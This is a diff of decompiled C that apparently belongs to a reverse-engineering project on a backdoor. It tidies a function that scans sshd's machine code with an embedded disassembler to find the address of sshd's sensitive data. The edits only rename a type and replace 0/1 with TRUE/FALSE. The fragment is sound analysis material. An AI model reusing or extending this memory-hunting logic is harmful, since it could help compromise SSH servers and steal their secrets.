@@ -39,7 +39,7 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
   undefined1 local_d8 [88];
   u8 *local_80;
   u64 local_78;
-  _union_77 local_70;
+  _union_78 local_70;
   byte local_60;
   int local_58;
   long local_50;
@@ -55,7 +55,7 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
   if (code_start_00 != (u8 *)0x0) {
     while (code_start_00 < code_end) {
       BVar2 = x86_dasm((dasm_ctx_t *)local_d8,code_start_00,code_end);
-      if (BVar2 == 0) {
+      if (BVar2 == FALSE) {
         code_start_00 = code_start_00 + 1;
       }
       else {
@@ -104,7 +104,7 @@ LAB_0010346b:
               puVar8 = (u8 *)(local_d8._0_8_ + local_d8._8_8_);
               uVar4 = 0;
               while (((puVar8 < code_end && (uVar4 < 6)) &&
-                     (BVar2 = x86_dasm((dasm_ctx_t *)&local_80,puVar8,code_end), BVar2 != 0))) {
+                     (BVar2 = x86_dasm((dasm_ctx_t *)&local_80,puVar8,code_end), BVar2 != FALSE))) {
                 if (local_58 == 0x109) {
                   if (((uint)local_70.field0.field11_0xc & 0xff00ff00) == 0x5000000) {
                     uVar1 = 0;
@@ -155,18 +155,18 @@ LAB_00103553:
             if (((puVar8 + 4 <= data_end) && (data_start <= puVar7)) && (puVar7 != (u8 *)0x0)) {
 LAB_0010365f:
               *sensitive_data_out = puVar7;
-              return 1;
+              return TRUE;
             }
           }
         }
         else if ((local_d8._40_4_ == 0xa5fe) && (code_start != (u8 *)local_d8._0_8_)) {
-          return 0;
+          return FALSE;
         }
 LAB_001033d1:
         code_start_00 = code_start_00 + local_d8._8_8_;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
